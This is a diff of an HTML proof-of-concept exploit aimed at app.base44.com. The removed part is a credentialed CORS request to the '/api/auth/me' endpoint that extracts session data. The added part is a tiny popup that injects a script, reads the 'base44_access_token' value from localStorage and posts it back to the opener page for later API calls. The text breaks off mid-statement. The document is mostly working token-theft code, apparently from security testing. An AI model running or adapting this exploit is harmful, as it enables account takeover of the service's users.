@@ -1,27 +1,55 @@
 <!DOCTYPE html>
 <html>
 <body>
-<center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
- 
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
- 
-<script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = alert(this.responseText);
-    }
-  };
-  xhttp.open("GET", "https://app.base44.com/api/auth/me", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-}
-</script>
- 
-</body>
-</html>
+    <button id="run">Run Automated CORS Test</button>
+    <pre id="output"></pre>
+
+    <script>
+        function log(msg) {
+            document.getElementById("output").innerText += msg + "\n";
+        }
+
+        document.getElementById("run").onclick = () => {
+            log("Opening app.base44.com...");
+            const popup = window.open("https://app.base44.com", "AuthPopup", "width=1,height=1");
+            
+            let injected = false;
+            
+            // Wait for popup to load
+            const checkInterval = setInterval(() => {
+                if (popup && popup.document && popup.document.body && !injected) {
+                    injected = true;
+                    clearInterval(checkInterval);
+                    
+                    log("Injecting token extractor script...");
+                    
+                    // Inject script into popup to extract token
+                    const script = popup.document.createElement("script");
+                    script.textContent = `
+                        (function() {
+                            const token = localStorage.getItem("base44_access_token");
+                            if (token) {
+                                console.log("Token found:", token);
+                                window.opener.postMessage({ type: "TOKEN", token: token }, "*");
+                                window.close();
+                            } else {
+                                window.opener.postMessage({ type: "TOKEN", token: null }, "*");
+                                alert("No token found in localStorage");
+                                window.close();
+                            }
+                        })();
+                    `;
+                    popup.document.body.appendChild(script);
+                }
+            }, 100);
+            
+            // Auto-close popup after 5 seconds
+            setTimeout(() => {
+                if (popup && !popup.closed) popup.close();
+            }, 5000);
+        };
+        
+        // Receive token and make API request
+        window.addEventListener("message", async (event) => {
+            if (event.data.type === "TOKEN") {
+                const token
